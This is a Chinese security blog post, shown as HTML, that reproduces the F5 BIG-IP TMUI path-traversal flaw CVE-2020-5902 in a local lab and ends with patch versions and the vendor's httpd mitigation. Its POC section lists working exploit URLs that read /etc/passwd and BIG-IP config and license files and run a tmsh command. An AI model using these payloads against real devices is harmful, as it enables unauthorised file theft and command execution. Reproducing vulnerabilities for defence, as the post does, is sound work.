@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/logo.ico">
+  <link rel="icon" type="image/png" href="/img/logo.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="VeFroth">
+  <meta name="keywords" content="">
+  <title>F5 BIG-IP远程代码执行漏洞复现（CVE-2020-5902） - VeFroth</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_yg9cfy8wd6.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>🍀🍀VeFroth🍀</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                主页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/head.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.2)">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2020-07-07 17:24">
+      2020年7月7日 下午
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <article class="markdown-body">
+              <h1 id="📝-漏洞描述"><a href="#📝-漏洞描述" class="headerlink" title="📝 漏洞描述"></a>📝 漏洞描述</h1><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>F5官方公布，流量管理用户界面（TMUI），也称为配置实用程序，在未公开的页面中具有远程执行代码（RCE）漏洞。 （<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5902" target="_blank" rel="noopener">CVE-2020-5902</a>）</p>
+<p>此漏洞允许未经身份验证的攻击者或经过身份验证的用户通过BIG-IP管理端口或自身IP通过网络访问Configuration Utility，以执行任意系统命令，创建或删除文件，禁用服务或执行任意Java代码。</p>
+<p>此问题未在数据平面上公开；仅控制平面受影响。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote>
+<p>BIG-IP 15.x: 15.1.0/15.0.0</p>
+</blockquote>
+<blockquote>
+<p>BIG-IP 14.x: 14.1.0 ~ 14.1.2</p>
+</blockquote>
+<blockquote>
+<p>BIG-IP 13.x: 13.1.0 ~ 13.1.3</p>
+</blockquote>
+<blockquote>
+<p>BIG-IP 12.x: 12.1.0 ~ 12.1.5</p>
+</blockquote>
+<blockquote>
+<p>BIG-IP 11.x: 11.6.1 ~ 11.6.5</p>
+</blockquote>
+<h1 id="🏠-本地环境搭建"><a href="#🏠-本地环境搭建" class="headerlink" title="🏠 本地环境搭建"></a>🏠 本地环境搭建</h1><h2 id="下载镜像文件"><a href="#下载镜像文件" class="headerlink" title="下载镜像文件"></a>下载镜像文件</h2><p>下载镜像前需要先注册一个F5账号</p>
+<p>点击链接：<code>https://www.f5.com.cn/trials/big-ip-virtual-edition</code></p>
+<p>开始注册</p>
+<p><img src="/2020/07/07/f5-big-ip/zc.png" srcset="/img/loading.gif" alt="zc"></p>
+<p>注册成功之后，开始下载</p>
+<p>下载链接👇</p>
+<p><code>https://downloads.f5.com/esd/product.jsp?sw=BIG-IP&amp;pro=big-ip_v12.x</code></p>
+<p>选择虚拟机版本✏</p>
+<img src="/2020/07/07/f5-big-ip/download1.png" srcset="/img/loading.gif" alt="download1" style="zoom: 50%;">
+
+
+
+<p>选择你想要的下载的版本，我选的是12.x系列的</p>
+<img src="/2020/07/07/f5-big-ip/download2.png" srcset="/img/loading.gif" alt="download2" style="zoom: 50%;">
+
+<p>最后选择下载节点，开始下载</p>
+<img src="/2020/07/07/f5-big-ip/download3.png" srcset="/img/loading.gif" alt="download3" style="zoom: 50%;">
+
+
+
+<p>下载过程耗时较长，要耐心等待噢🐵。。。</p>
+<h2 id="安装虚拟机"><a href="#安装虚拟机" class="headerlink" title="安装虚拟机"></a>安装虚拟机</h2><p>下载完成后，直接用VMware打开镜像文件💿</p>
+<img src="/2020/07/07/f5-big-ip/a1.png" srcset="/img/loading.gif" alt="a1" style="zoom: 50%;">
+
+
+
+<p>可以自定义虚拟机存放的位置⌨</p>
+<img src="/2020/07/07/f5-big-ip/a2.png" srcset="/img/loading.gif" alt="a2" style="zoom: 33%;">
+
+
+
+<p>根据需求，选择虚拟机内存大小📱</p>
+<img src="/2020/07/07/f5-big-ip/a3.png" srcset="/img/loading.gif" alt="a3" style="zoom: 33%;">
+
+
+
+<p>正在导入。。。</p>
+<img src="/2020/07/07/f5-big-ip/a4.png" srcset="/img/loading.gif" alt="a4" style="zoom: 50%;">
+
+
+
+<h2 id="开启虚拟机"><a href="#开启虚拟机" class="headerlink" title="开启虚拟机"></a>开启虚拟机</h2><p>导入成功后，开启虚拟机</p>
+<img src="/2020/07/07/f5-big-ip/open1.png" srcset="/img/loading.gif" alt="open1" style="zoom: 50%;">
+
+
+
+<p>使用默认账号密码登录（root/default）</p>
+<img src="/2020/07/07/f5-big-ip/open2.png" srcset="/img/loading.gif" alt="open2" style="zoom: 50%;">
+
+
+
+<p>然后命令行输入，config命令，回车两次，可以看到虚拟机地址</p>
+<img src="/2020/07/07/f5-big-ip/open3.png" srcset="/img/loading.gif" alt="open3" style="zoom: 50%;">
+
+<img src="/2020/07/07/f5-big-ip/open4.png" srcset="/img/loading.gif" alt="open4" style="zoom: 50%;">
+
+
+
+<p>选择<strong>Yes</strong>，再次回车。</p>
+<p>选择<strong>No</strong>，可以修改虚拟机地址。</p>
+<p>🕛🕛🕛🕛🕛</p>
+<p>打开管理页面地址：https: //172.16.70.202/</p>
+<img src="/2020/07/07/f5-big-ip/open5.png" srcset="/img/loading.gif" alt="open5" style="zoom: 50%;">
+
+
+
+<p>使用默认账户密码admin-admin登录</p>
+<img src="/2020/07/07/f5-big-ip/open6.png" srcset="/img/loading.gif" alt="open6" style="zoom: 50%;">
+
+
+
+<p>到这里环境搭建基本就结束了，漏洞复现不需要激活，下载试用版即可。。</p>
+<h1 id="🚟-漏洞复现"><a href="#🚟-漏洞复现" class="headerlink" title="🚟 漏洞复现"></a>🚟 漏洞复现</h1><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><blockquote>
+<p>poc：https: //url/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</p>
+</blockquote>
+<p>执行成功截图🎃</p>
+<p><img src="/2020/07/07/f5-big-ip/end.png" srcset="/img/loading.gif" alt="end"></p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code class="hljs crystal"><span class="hljs-number">1</span>、<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/URL/tmui</span><span class="hljs-regexp">/login.jsp/</span>..;<span class="hljs-regexp">/tmui/locallb</span><span class="hljs-regexp">/workspace/file</span>Read.jsp?fileName=<span class="hljs-regexp">/etc/passwd</span>
+<span class="hljs-number">2</span>、<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/URL/tmui</span><span class="hljs-regexp">/login.jsp/</span>..;<span class="hljs-regexp">/tmui/locallb</span><span class="hljs-regexp">/workspace/file</span>Read.jsp?fileName=<span class="hljs-regexp">/etc/hosts</span>
+<span class="hljs-number">3</span>、<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/URL/tmui</span><span class="hljs-regexp">/login.jsp/</span>..;<span class="hljs-regexp">/tmui/locallb</span><span class="hljs-regexp">/workspace/file</span>Read.jsp?fileName=<span class="hljs-regexp">/config/bigip</span>.license
+<span class="hljs-number">4</span>、<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/URL/tmui</span><span class="hljs-regexp">/login.jsp/</span>..;<span class="hljs-regexp">/tmui/locallb</span><span class="hljs-regexp">/workspace/file</span>Read.jsp?fileName=<span class="hljs-regexp">/config/bigip</span>.conf
+<span class="hljs-number">5</span>、<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/URL/tmui</span><span class="hljs-regexp">/login.jsp/</span>..;<span class="hljs-regexp">/tmui/locallb</span><span class="hljs-regexp">/workspace/tmsh</span>Cmd.jsp?command=list+auth+user+admin</code></pre>
+
+
+
+<h1 id="🔍-修复建议"><a href="#🔍-修复建议" class="headerlink" title="🔍 修复建议"></a>🔍 修复建议</h1><h2 id="升级版本"><a href="#升级版本" class="headerlink" title="升级版本"></a>升级版本</h2><blockquote>
+<p>BIG-IP 15.x: 15.1.0.4</p>
+</blockquote>
+<blockquote>
+<p>BIG-IP 14.x: 14.1.2.6</p>
+</blockquote>
+<blockquote>
+<p>BIG-IP 13.x: 13.1.3.4</p>
+</blockquote>
+<blockquote>
+<p>BIG-IP 12.x: 12.1.5.2</p>
+</blockquote>
+<blockquote>
+<p>BIG-IP 11.x: 11.6.5.2</p>
+</blockquote>
+<h2 id="官方加固建议"><a href="#官方加固建议" class="headerlink" title="官方加固建议"></a>官方加固建议</h2><ol>
+<li>通过输入以下命令登录到TMOS Shell（tmsh）:</li>
+</ol>
+<blockquote>
+<p>tmsh</p>
+</blockquote>
+<ol start="2">
+<li><p>通过输入以下命令来编辑httpd属性：</p>
+<blockquote>
+<p>edit /sys httpd all-properties</p>
+</blockquote>
+</li>
+<li><p>替换文件内容</p>
+<blockquote>
+<p><code>include &#39; &lt;LocationMatch &quot;.*..;.*&quot;&gt; Redirect 404 / &lt;/LocationMatch&gt; &#39;</code></p>
+</blockquote>
+</li>
+<li><p>保存文件</p>
+<blockquote>
+<p>按下Esc，输入 :wq</p>
+</blockquote>
+</li>
+<li><p>再次确定</p>
+<blockquote>
+<p>当进一步提示您保存更改（y / n / e）时，输入s <strong>y</strong></p>
+</blockquote>
+</li>
+<li><p>保存配置</p>
+<blockquote>
+<p>save /sys config</p>
+</blockquote>
+</li>
+<li><p>请输入以下命令来重新启动httpd服务：</p>
+<blockquote>
+<p>restart  sys  service  httpd</p>
+</blockquote>
+</li>
+<li><p>退出tmsh</p>
+<blockquote>
+<p>quit</p>
+</blockquote>
+</li>
+</ol>
+<hr>
+<p>   参考链接</p>
+<p>   https: //support.f5.com/csp/article/K52145254</p>
+<p>   https: //mp.weixin.qq.com/s/M5vuDHlKLKcsI_enBNd21g</p>
+<p>   https: //blog.csdn.net/qq_43645782/article/details/107153306?%3E</p>
+<center><h6> 🏷 ENDING 🏷</h6></center>
+
+<p>​                                                                  </p>
+
+            </article>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-6">
+                    
+                    
+                  </div>
+                  <div class="post-next col-6">
+                    
+                    
+                      <a href="/2020/07/02/very-good/">
+                        <span class="hidden-mobile">very-good</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: 'article.markdown-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "F5 BIG-IP远程代码执行漏洞复现（CVE-2020-5902）&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
